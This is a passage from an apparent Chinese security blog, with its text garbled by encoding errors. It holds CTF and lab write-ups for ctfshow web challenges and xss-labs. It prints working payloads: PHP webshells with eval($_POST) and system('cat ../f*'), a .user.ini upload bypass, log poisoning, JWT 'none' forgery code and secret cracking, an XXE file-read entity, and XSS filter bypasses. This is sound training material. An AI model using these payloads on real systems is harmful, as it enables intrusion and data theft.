class="headerlink" title="web154"></a>web154</h3><p>MIMEç±»å‹æ£€æµ‹+é»‘åå•æ£€æµ‹+æ–‡ä»¶å†…å®¹æ£€æµ‹</p><p>æ–‡ä»¶å†…å®¹æ£€æµ‹è¿‡æ»¤äº†phpï¼Œç”¨çŸ­æ ‡ç­¾ç»•è¿‡<code>&lt;?= eval($_POST[&#39;a&#39;]); ?&gt;</code></p><p>æ¥ä¸‹æ¥åŒweb153</p><h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>åŒweb154</p><p>å’Œweb154çš„åŒºåˆ«æ˜¯upload.phpä¸­ç”¨äºæŸ¥æ‰¾phpçš„å‡½æ•°ä¸åŒ</p><ul><li>web154ï¼šstrrpos()ä»å­—ç¬¦ä¸²æœ«å°¾å¼€å§‹æŸ¥æ‰¾å­ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®å¹¶è¿”å›ç´¢å¼•ï¼ŒåŒºåˆ†å¤§å°å†™</li><li>web155ï¼šstripos()ä»å­—ç¬¦ä¸²å¼€å¤´å¼€å§‹æŸ¥æ‰¾å­ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®å¹¶è¿”å›ç´¢å¼•ï¼Œä¸åŒºåˆ†å¤§å°å†™</li></ul><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>è¿‡æ»¤äº†phpå’Œ[</p><p>ä¸Šä¼ user.iniï¼Œæ–‡ä»¶å†…å®¹<code>auto_prepend_file=shell.png</code>ï¼Œä¸Šä¼ æˆåŠŸåï¼Œä¸Šä¼ shell.pngç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-meta">&lt;?</span>= <span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat ../f*&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ–ç”¨{}æ›¿æ¢[]ï¼Œ<code>&lt;?= eval($_POST&#123;&#39;a&#39;&#125;); ?&gt;</code></p><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>è¿‡æ»¤äº†phpå’Œâ€œ[{;â€</p><p>ä¸Šä¼ user.iniï¼Œæ–‡ä»¶å†…å®¹<code>auto_prepend_file=shell.png</code>ï¼Œä¸Šä¼ æˆåŠŸåï¼Œä¸Šä¼ shell.pngç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-meta">&lt;?</span>= <span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac ../f*&#x27;</span>) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>è¿‡æ»¤äº†phpå’Œâ€[{;â€</p><p>åŒweb157</p><p>åœ¨æŸ¥çœ‹è¯¥é¢˜æºç çš„æ—¶å€™å‘ç°è¿˜è¿‡æ»¤äº†logï¼Œåº”è¯¥æ˜¯é˜²æ­¢åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡æ‹¼æ¥çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œshell.pngå†…å®¹</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åæŠ“åŒ…åœ¨uaå¤´æ’å…¥ä¸€å¥è¯æœ¨é©¬</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">payload:url/upload/index.php<br>postä¼ a=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat ../flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>è¿‡æ»¤äº†phpã€logå’Œâ€™[{;(â€˜</p><p>ä¸Šä¼ user.iniï¼Œæ–‡ä»¶å†…å®¹<code>auto_prepend_file=shell.png</code>ï¼Œä¸Šä¼ æˆåŠŸåï¼Œä¸Šä¼ shell.png</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span> <span class="hljs-string">`nl ../f*`</span> <span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>è¿‡æ»¤äº†phpã€logã€ç©ºæ ¼ã€åå¼•å·å’Œâ€[{(;â€</p><p>é€šè¿‡æ‹¼æ¥çš„æ–¹å¼å»åŒ…å«æ—¥å¿—æ–‡ä»¶</p><p>åŒweb158</p><h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>è¿‡æ»¤äº†phpã€logã€ç©ºæ ¼ã€åå¼•å·å’Œâ€[{(;â€</p><p>ç›´æ¥ä¸Šä¼ åˆæ³•çš„shell.pngå¤±è´¥ï¼Œåº”è¯¥æ˜¯åŠ äº†ä¸€ä¸ªæ–‡ä»¶å¹»æ•°å¤´æ£€æµ‹</p><p>åœ¨shell.pngå’Œ.user.iniæ–‡ä»¶é¦–éƒ¨åŠ ä¸€ä¸ª<code>GIF89a</code>ï¼Œä¸Šä¼ æˆåŠŸï¼Œæ¥ä¸‹æ¥åŒweb158</p><h3 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h3><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><h2 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h2><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><h2 id="phpCVE"><a href="#phpCVE" class="headerlink" title="phpCVE"></a>phpCVE</h2><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h2 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h2><h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><h3 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h3><p>æŸ¥çœ‹æºç æç¤º<code>&lt;!-- /admin --&gt;</code></p><p>è®¿é—®å¹¶æŠ“åŒ…ï¼Œå‘ç°æ²¡æœ‰ç­¾åçš„jwt</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">JWTæ”¯æŒå°†ç®—æ³•è®¾ç½®ä¸º<span class="hljs-string">&quot;None&quot;</span>ï¼Œå¦‚æœ<span class="hljs-string">&quot;alg&quot;</span>å­—æ®µè®¾ä¸º<span class="hljs-string">&quot;None&quot;</span>ï¼Œé‚£ä¹ˆç­¾åå°±ä¼šè¢«ç½®ç©ºï¼Œè¿™æ ·ä»»ä½•<span class="hljs-keyword">token</span>éƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œè‹¥ä¸å…³é—­è¯¥åŠŸèƒ½åˆ™å¯ä»¥é€šè¿‡ä¼ªé€ <span class="hljs-keyword">token</span>å†’å……ä»»æ„ç”¨æˆ·ç™»å½•<br></code></pre></td></tr></table></figure><p>base64åˆ†åˆ«è§£ç åï¼Œå°†payloadä¸­subçš„å€¼æ”¹ä¸ºadmin</p><p>ç„¶ååœ¨<a href="https://www.json.cn/jwt">åœ¨çº¿jwtåŠ &#x2F;è§£å¯†</a>é€‰å®šä¸€ä¸ªæ–°çš„ç­¾åç®—æ³•ï¼Œç”Ÿæˆæ–°çš„token</p><p><img src="/../images/ctfshow/web345_1.png"></p><p>å°†åŸtokenæ›¿æ¢åï¼Œé‡æ”¾</p><p><img src="/../images/ctfshow/web345_2.png"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">å¦‚æœæ˜¯é€šè¿‡bpæŠ“åŒ…é‡æ”¾çš„æ–¹å¼å»æ‹¿flagï¼Œåº”è¯¥è®¿é—®`/admin/`ï¼Œè€Œä¸æ˜¯è®¿é—®`/admin`ï¼ŒåŒºåˆ«åœ¨äºï¼šè®¿é—®`/admin`ï¼ŒæœåŠ¡å™¨ä¼˜å…ˆåœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å¯»æ‰¾åä¸ºadminçš„æ–‡ä»¶ï¼Œè‹¥æœªæ‰¾åˆ°è¯¥æ–‡ä»¶ï¼Œéƒ¨åˆ†æœåŠ¡å™¨ä¼šè§¦å‘â€œè·¯å¾„è¡¥å…¨â€æœºåˆ¶ï¼Œè‡ªåŠ¨é‡å®šå‘åˆ°`/admin/`ï¼›è€Œè®¿é—®`/admin/`æœåŠ¡å™¨æ˜ç¡®è¯†åˆ«ä¸ºè®¿é—®adminç›®å½•ï¼ŒæŸ¥æ‰¾ç›®å½•ä¸‹çš„é»˜è®¤ç´¢å¼•æ–‡ä»¶(å¦‚ï¼šindex.php)ï¼Œè¿™é‡Œä¸æ˜¯å¾ˆæ¸…æ¥šä¸ºä»€ä¹ˆbpé‡æ”¾å`Follow redirection`ï¼Œæ‹¿ä¸åˆ°flagï¼Œä½†æ˜¯åœ¨æµè§ˆå™¨ç«¯æ›¿æ¢æ–°tokenåç›´æ¥è®¿é—®`/admin`å¯ä»¥æ‹¿åˆ°flag<br></code></pre></td></tr></table></figure><h3 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h3><p>æœåŠ¡ç«¯å¹¶æœªæ ¡éªŒJWTç­¾åï¼Œå°†å¤´éƒ¨â€™algâ€™å­—æ®µæ”¹ä¸ºâ€˜Noneâ€™ï¼Œè½½è·â€™subâ€™å­—æ®µæ”¹ä¸ºâ€™adminâ€™</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import jwt<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;alg&#x27;</span>: <span class="hljs-string">&#x27;none&#x27;</span>,<br>    <span class="hljs-string">&#x27;typ&#x27;</span>: <span class="hljs-string">&#x27;JWT&#x27;</span><br>&#125;<br><br>payload = &#123;<br>    <span class="hljs-string">&quot;iss&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;iat&quot;</span>:1757484578,<br>    <span class="hljs-string">&quot;exp&quot;</span>:1757491778,<br>    <span class="hljs-string">&quot;nbf&quot;</span>:1757484578,<br>    <span class="hljs-string">&quot;sub&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;jti&quot;</span>:<span class="hljs-string">&quot;cc36071f4a4a44191cefd488b12fc7d9&quot;</span><br>&#125;<br><br>jwt_token = jwt.encode(payload, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-attribute">algorithm</span>=<span class="hljs-string">&#x27;none&#x27;</span>, <span class="hljs-attribute">headers</span>=headers)<br><br><span class="hljs-built_in">print</span>(jwt_token)<br><br></code></pre></td></tr></table></figure><p>å°†åŸtokenæ›¿æ¢åé‡æ”¾ï¼Œå³å¯æ‹¿åˆ°flag</p><h3 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h3><p>é¢˜ç›®æç¤ºï¼Œå¼±å£ä»¤ï¼Œæ‹¿åˆ°tokenç”¨<a href="https://github.com/brendan-rius/c-jwt-cracker">jwtcrack</a>è¿›è¡Œçˆ†ç ´</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span class="hljs-selector-class">.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc1NzUxMjAyMiwiZXhwIjoxNzU3NTE5MjIyLCJuYmYiOjE3NTc1MTIwMjIsInN1YiI6InVzZXIiLCJqdGkiOiJhYjE5MzM1MWU2ZWEzNWNkZWE5ODEzYTE0ZWEyZjY1MiJ9</span><span class="hljs-selector-class">.RIGwul9JbRpMswEVVrfkdii43BjEb0_eGH7X8G0OmJA</span> <span class="hljs-number">0123456789</span> <span class="hljs-number">6</span> sha256<br></code></pre></td></tr></table></figure><p>çˆ†å‡ºkeyæ˜¯â€123456â€</p><p>å°†payloadä¸­çš„subå­—æ®µæ”¹ä¸ºadminï¼Œå†encodeä¸€ä¸‹ï¼Œç„¶åå°†åŸtokenæ›¿æ¢å³å¯</p><h3 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h3><p>ç±»ä¼¼äºweb347</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2021-01-07 12:59:52</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p><code>libxml_disable_entity_loader(false);</code>å¯ç”¨äº†å®ä½“åŠ è½½ï¼Œ<code>LIBXML_NOENT</code>æ ‡å¿—å…è®¸è§£æå¤–éƒ¨å®ä½“æ›¿æ¢å®ä½“å¼•ç”¨ï¼Œ<code>LIBXML_DTDLOAD</code>æ ‡å¿—å…è®¸åŠ è½½å¤–éƒ¨DTDæ–‡ä»¶ï¼Œæœ€åè·å–å¹¶è¾“å‡ºåä¸ºctfshowçš„xmlå…ƒç´ </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-symbol">&amp;xxe;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h3><p>Updatingâ€¦</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss-labs</title>
    <link href="/2025/07/24/xss-labs/"/>
    <url>/2025/07/24/xss-labs/</url>
    
    <content type="html"><![CDATA[<h2 id="è¿‡å…³æœºåˆ¶"><a href="#è¿‡å…³æœºåˆ¶" class="headerlink" title="è¿‡å…³æœºåˆ¶"></a>è¿‡å…³æœºåˆ¶</h2><p>è®©æµè§ˆå™¨å¼¹çª—å³å¯è¿›å…¥ä¸‹ä¸€å…³ï¼Œæ€æ ·èƒ½ä½¿æµè§ˆå™¨å¼¹çª—å‘¢ï¼Œå¯ä»¥çœ‹è¿™ä½å¸ˆå‚…çš„æ–‡ç« <a href="https://blog.csdn.net/LYJ20010728/article/details/116462782?fromshare=blogdetail&sharetype=blogdetail&sharerId=116462782&sharerefer=PC&sharesource=2302_79586141&sharefrom=from_link">XSSå¸¸è§çš„è§¦å‘æ ‡ç­¾</a></p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>getä¼ å‚nameçš„å€¼è¢«ç›´æ¥æ’å…¥åˆ°äº†htmlä¸­</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">payloadï¼šurl/<span class="hljs-built_in">?name</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>keywordçš„å€¼è¢«è½¬ä¹‰åæ‰æ’å…¥åˆ°htmlä¸­ï¼Œä½†æ˜¯inputæ ‡ç­¾ä¸­valueçš„å€¼æ²¡æœ‰è½¬ä¹‰</p><p><img src="/../images/xss-labs/level2_1.png"></p><p>å¯¹inputæ ‡ç­¾è¿›è¡Œé—­åˆ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">payloadï¼šurl/?keyword=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>htmlspecialchars()ï¼šåœ¨ PHP ä¸­ç”¨äºå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“çš„å‡½æ•°ã€‚</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">&amp;ï¼ˆå’Œå·ï¼‰ è½¬æ¢ä¸º <span class="hljs-symbol">&amp;amp;</span><br>&quot;ï¼ˆåŒå¼•å·ï¼‰ è½¬æ¢ä¸º <span class="hljs-symbol">&amp;quot;</span>ï¼ˆé™¤éè®¾ç½®äº†ENT_NOQUOTESåˆ™ä¸è¿›è¡Œè½¬ä¹‰ï¼‰<br>&#x27;ï¼ˆå•å¼•å·ï¼‰ è½¬æ¢ä¸º <span class="hljs-symbol">&amp;#039;</span>æˆ–è€… <span class="hljs-symbol">&amp;apos;</span>ï¼ˆå½“è®¾ç½®äº†ENT_QUOTESæ ‡å¿—æ—¶æ‰è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚æœæ˜¯ ENT_HTML401åˆ™è½¬ä¹‰ä¸ºå‰è€…ï¼Œå¦‚æœæ˜¯ ENT_XML1ã€ ENT_XHTML æˆ– ENT_HTML5åˆ™è½¬ä¹‰ä¸ºåè€…ï¼‰<br>&lt;ï¼ˆå°äºå·ï¼‰ è½¬æ¢ä¸º <span class="hljs-symbol">&amp;lt;</span><br>&gt;ï¼ˆå¤§äºå·ï¼‰ è½¬æ¢ä¸º <span class="hljs-symbol">&amp;gt;</span><br></code></pre></td></tr></table></figure><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>keywordçš„å€¼è¢«è½¬ä¹‰åæ‰æ’å…¥åˆ°htmlä¸­ï¼Œä¸”inputæ ‡ç­¾ä¸­valueçš„å€¼ä¹Ÿè¢«è½¬ä¹‰</p><p><img src="/../images/xss-labs/level3_1.png"></p><p>ä½†æ˜¯valueç”¨çš„æ˜¯å•å¼•å·è¿›è¡Œé—­åˆï¼Œè€Œhtmlspecialcharsé»˜è®¤é…ç½®ä¸­å•å¼•å·ä¸è¿›è¡Œè½¬ä¹‰</p><p>å¯ä»¥ç”¨å•å¼•å·å°†valueè¿›è¡Œé—­åˆï¼Œç„¶ååˆ©ç”¨é¼ æ ‡äº‹ä»¶è¿›è¡Œå¼¹çª—</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">payloadï¼šurl/<span class="hljs-string">?k</span>eyword=<span class="hljs-string">&#x27; onclick=alert() &#x27;</span><br></code></pre></td></tr></table></figure><p>æ›´å¤šçš„<a href="https://www.runoob.com/tags/ref-eventattributes.html">htmläº‹ä»¶</a></p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>â€˜&lt;&gt;â€™ä¼¼ä¹è¢«è¿‡æ»¤äº†</p><p><img src="/../images/xss-labs/level4_1.png"></p><p>ç”¨åŒå¼•å·å¯¹valueè¿›è¡Œé—­åˆï¼Œç„¶ååˆ©ç”¨é¼ æ ‡äº‹ä»¶è¿›è¡Œå¼¹çª—</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">payloadï¼šurl/<span class="hljs-string">?k</span>eyword=<span class="hljs-string">&quot; onclick=alert() &quot;</span><br></code></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>å°†ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸­çš„&lt;scriptæ›¿æ¢ä¸ºäº†&lt;scr_ipt</p><p><img src="/../images/xss-labs/level5_1.png"></p><p>onæ›¿æ¢ä¸ºäº†o_n</p><p><img src="/../images/xss-labs/level5_2.png"></p><p>åˆ©ç”¨aæ ‡ç­¾å»æ‰§è¡Œjavascriptä»£ç </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">payloadï¼šurl/?keyword=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure><p>å¸¸ç”¨çš„hrefå±æ€§çš„å€¼</p><table><thead><tr><th><strong>ç±»å‹</strong></th><th><strong>è¯­æ³•</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td><strong>ç»å¯¹ URL</strong></td><td><code>https://åŸŸå/è·¯å¾„</code></td><td>å®Œæ•´çš„ç½‘ç»œåœ°å€ï¼ŒåŒ…å«åè®®å’ŒåŸŸåï¼Œç”¨äºè·¨ç½‘ç«™é“¾æ¥ã€‚</td></tr><tr><td><strong>ç›¸å¯¹ URL</strong></td><td><code>æ–‡ä»¶è·¯å¾„</code></td><td>ç›¸å¯¹äºå½“å‰é¡µé¢çš„è·¯å¾„ï¼Œç”¨äºç½‘ç«™å†…éƒ¨é“¾æ¥ï¼Œé¿å…ç¡¬ç¼–ç åŸŸåï¼Œä¾¿äºè¿ç§»ã€‚</td></tr><tr><td><strong>é”šç‚¹é“¾æ¥</strong></td><td><code>#å…ƒç´ ID</code></td><td>è·³è½¬åˆ°å½“å‰æˆ–å…¶ä»–é¡µé¢ä¸­å…·æœ‰å¯¹åº” <code>id</code> çš„å…ƒç´ ä½ç½®ã€‚</td></tr><tr><td><strong>é‚®ä»¶é“¾æ¥</strong></td><td><code>mailto:é‚®ç®±åœ°å€</code></td><td>ç‚¹å‡»åæ‰“å¼€é»˜è®¤é‚®ä»¶å®¢æˆ·ç«¯å¹¶å¡«å†™æ”¶ä»¶äººåœ°å€ï¼Œå¯é™„åŠ ä¸»é¢˜ã€å†…å®¹ç­‰å‚æ•°ã€‚</td></tr><tr><td><strong>ç”µè¯é“¾æ¥</strong></td><td><code>tel:ç”µè¯å·ç </code></td><td>ç§»åŠ¨ç«¯ç‚¹å‡»åæ‹¨æ‰“ç”µè¯ï¼Œæ¡Œé¢ç«¯å¯èƒ½æ— ååº”ã€‚</td></tr><tr><td><strong>çŸ­ä¿¡é“¾æ¥</strong></td><td><code>sms:ç”µè¯å·ç </code></td><td>ç§»åŠ¨ç«¯ç‚¹å‡»åæ‰“å¼€çŸ­ä¿¡åº”ç”¨å¹¶å¡«å†™æ”¶ä»¶äººï¼Œå¯é™„åŠ çŸ­ä¿¡å†…å®¹å‚æ•°ã€‚</td></tr><tr><td><strong>JavaScript</strong></td><td><code>javascript:ä»£ç </code></td><td>æ‰§è¡Œ JavaScript ä»£ç ï¼Œç›´æ¥ä½¿ç”¨å­˜åœ¨å®‰å…¨é£é™©ï¼Œä¸æ¨èã€‚</td></tr><tr><td><strong>æ— è·³è½¬</strong></td><td><code>javascript:void(0)</code></td><td>å ä½é“¾æ¥ï¼Œç‚¹å‡»åä¸æ‰§è¡Œä»»ä½•è·³è½¬ï¼Œéœ€é…åˆ JavaScript å®ç°äº¤äº’ã€‚</td></tr><tr><td><strong>åˆ·æ–°å½“å‰é¡µé¢</strong></td><td><code>#</code></td><td>ç‚¹å‡»åè·³è½¬åˆ°å½“å‰é¡µé¢é¡¶éƒ¨ï¼ˆå¸¦ <code>#</code> å“ˆå¸Œï¼‰ã€‚</td></tr><tr><td><strong>æ–‡ä»¶ä¸‹è½½</strong></td><td><code>æ–‡ä»¶è·¯å¾„æˆ–URL</code></td><td>æŒ‡å‘å¯ä¸‹è½½çš„æ–‡ä»¶ï¼Œæ·»åŠ  <code>download</code> å±æ€§å¯å¼ºåˆ¶ä¸‹è½½ã€‚</td></tr></tbody></table><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>scriptã€onã€hrefã€srcç­‰å‡è¢«wafäº†ï¼Œä¼¼ä¹ç»å¤§å¤šæ•°çš„å…³é”®å­—éƒ½è¢«æ›¿æ¢äº†</p><p>å°è¯•ç”¨å¤§å°å†™ç»•è¿‡</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">payloadï¼šurl/?keyword=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">Href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&lt;&quot;<br></code></pre></td></tr></table></figure><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>scriptè¢«æ›¿æ¢ä¸ºç©º</p><p><img src="/../images/xss-labs/level7_1.png"></p><p>å°è¯•åŒå†™ç»•è¿‡</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span 